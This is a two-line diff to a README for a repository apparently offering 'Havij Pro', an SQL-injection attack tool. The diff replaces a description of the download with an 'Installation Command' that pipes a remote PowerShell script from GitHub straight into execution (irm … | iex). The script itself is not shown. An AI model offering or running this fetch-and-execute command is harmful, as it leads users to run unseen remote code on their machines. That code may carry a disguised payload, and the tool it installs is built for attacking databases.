@@ -1,2 +1,2 @@
-# havij-pro
-This allows you to download and extract Havij Portable Version to your system. C
+# Installation Command
+irm https://raw.githubusercontent.com/sahmsec/havij-Pro/main/aws-install.ps1 | iex
